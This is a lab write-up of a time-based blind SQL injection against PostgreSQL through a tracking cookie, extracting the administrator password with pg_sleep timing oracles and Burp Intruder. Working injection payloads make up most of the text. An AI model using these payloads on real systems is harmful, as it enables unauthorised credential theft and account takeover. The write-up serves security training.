# Blind SQL injection with time delays and information retrieval

**Tags:** `Blind SQL injection` · `PostgreSQL` · `time-based` · `pg_sleep` · `conditional delays` · `Burp Intruder` · `credential extraction`

## Objective

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## 1. Confirming the injection point

Captured a request and modified the `TrackingId` cookie to inject a raw `pg_sleep()` call:

```
TrackingId=VUJHweGHPTjhmtX2' || pg_sleep(2)--+
```

This produced a **~2,000 ms** response delay. Increasing the sleep duration to confirm control over the delay:

```
TrackingId=VUJHweGHPTjhmtX2' || pg_sleep(5)--+
```

Resulted in a **~5,000 ms** delay, confirming the injection point is exploitable and the backend executes injected SQL synchronously.

## 2. Switching to a conditional time-based payload

A raw `pg_sleep()` only proves injection is possible - to extract data, the delay needs to be **conditional** on a true/false statement. Used a stacked query with a `CASE WHEN` expression so the delay only fires if the condition evaluates to true:

```sql
VUJHweGHPTjhmtX2';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--+
```

URL-encoded as sent:

```
VUJHweGHPTjhmtX2'%3bselect+case+when+(1=1)+then+pg_sleep(5)+else+pg_sleep(0)+end--+
```

**Result:** 5 second delay (condition `1=1` is true).

Tested the false branch to validate the oracle:

```
VUJHweGHPTjhmtX2'%3bselect+case+when+(1=2)+then+pg_sleep(5)+else+pg_sleep(0)+end--+
```

**Result:** no delay (condition `1=2` is false). This confirmed a reliable **boolean oracle via time delay** — the injection point and conditional logic both work as expected.

## 3. Confirming the administrator account exists

With the table and column names given by the lab (`users`, `username`, `password`), tested whether the `administrator` user exists:

```
VUJHweGHPTjhmtX2'%3bselect+case+when+(username='administrator')+then+pg_sleep(5)+else+pg_sleep(0)+end+from+users--+
```

**Result:** 5 second delay → user exists.

Sanity-checked with a deliberately wrong username:

```
VUJHweGHPTjhmtX2'%3bselect+case+when+(username='administrators')+then+pg_sleep(5)+else+pg_sleep(0)+end+from+users--+
```

**Result:** no delay → confirms the oracle is genuinely tied to the username match, not a false positive.

## 4. Determining the password length

Used `length(password)` inside the conditional to binary-search the password length, increasing the threshold and watching for the delay to disappear:

| Payload condition | Result |
|---|---|
| `length(password)>1` | Delay (5s) |
| `length(password)>5` | Delay (5s) |
| `length(password)>10` | Delay (5s) |
| `length(password)>15` | Delay (5s) |
| `length(password)>20` | **No delay** |

This narrowed the length to somewhere at or below 20. Switched to exact-match checks to pin down the precise value:

```
VUJHweGHPTjhmtX2'%3bselect+case+when+(username='administrator'+and+length(password)=19)+then+pg_sleep(5)+else+pg_sleep(0)+end+from+users--+
```

**Result:** no delay (length ≠ 19).

```
VUJHweGHPTjhmtX2'%3bselect+case+when+(username='administrator'+and+length(password)=20)+then+pg_sleep(5)+else+pg_sleep(0)+end+from+users--+
```

**Result:** 5 second delay → **password length confirmed as 20 characters.**

## 5. Extracting the password character-by-character

With the length known, used `substr(password, position, 1)` to test individual characters, validating the technique manually first:

```sql
VUJHweGHPTjhmtX2';select case when (username='administrator' and length(password)=20 and substr(password,1,1)='a') then pg_sleep(10) else pg_sleep(0) end from users--+
```

Once the single-character logic was confirmed working, automated the full extraction in **Burp Intruder** using **Sniper/Bruteforce** mode, sweeping the character set across each position with a payload template such as:

```
VUJHweGHPTjhmtX2'%3bselect+case+when+(username='administrator'+and+length(password)=20+and+substr(password,20,1)='$$')+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--+
```

The `$$` marker was swept across the position index (1–20) and the alphanumeric character set, with **response time** used as the grep/sort signal — any request taking ~10 seconds indicated a correct character at that position. Repeated this across all 20 positions to reconstruct the full password.

**Recovered password (character by character):**

```
l17mo8z69s80hdiyklvs
```

## 6. Verifying the extracted password

Confirmed the full extracted value against the database directly in Repeater:

```
VUJHweGHPTjhmtX2'%3bselect+case+when+(username='administrator'+and+length(password)=20+and+substr(password,1,20)='l17mo8z69s80hdiyklvs')+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--+
```

**Result:** 10 second delay → full password match confirmed.

## 7. Solving the Lab

Logged into the application with:

| Field    | Value                  |
|----------|------------------------|
| Username | `administrator`        |
| Password | `l17mo8z69s80hdiyklvs` |

Login succeeded as `administrator` - lab solved.